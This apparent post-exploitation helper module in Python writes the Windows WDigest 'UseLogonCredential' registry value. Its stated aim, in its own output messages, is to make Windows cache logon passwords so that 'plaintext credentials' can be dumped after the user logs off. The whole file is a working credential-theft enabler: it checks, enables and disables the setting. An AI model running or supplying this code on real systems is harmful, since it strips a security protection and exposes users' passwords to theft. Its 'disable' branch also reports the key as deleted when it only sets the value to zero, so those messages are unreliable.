from _winreg import *


def modifyKey(keyPath, regPath, value, root=HKEY_LOCAL_MACHINE):
	aReg = ConnectRegistry(None, root)

	try:
		aKey = OpenKey(aReg, keyPath, 0, KEY_WRITE)
		SetValueEx(aKey, regPath, 0, REG_DWORD, value)
		CloseKey(aKey)
	except Exception, e:
		return False, e

	return True, ''


def queryValue(keyPath, regPath, root=HKEY_LOCAL_MACHINE):
	aReg = ConnectRegistry(None, root)
	try:
		aKey = OpenKey(aReg, keyPath, 0, KEY_READ)
		value = QueryValueEx(aKey, regPath)
		CloseKey(aKey)
		if value[0] == 0:
			return False, 'UseLogonCredential disabled'
		else:
			return True, 'UseLogonCredential already enabled'
	except:
		return False, 'UseLogonCredential key not found, you should create it'

def wdigest(action):
	key_path = r"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\"
	key_name = 'UseLogonCredential'

	if action == 'check':
		return queryValue(key_path, key_name)
	elif action == 'enable':
		ok, message =  modifyKey(key_path, key_name, 1)
		if ok: 
			message = 'UseLogonCredential key created, logoff the user session to dump plaintext credentials'
		return ok, message
	elif action == 'disable':
		ok, message =  modifyKey(key_path, key_name, 0)
		if ok: 
			message = 'UseLogonCredential key deleted'
		return ok, message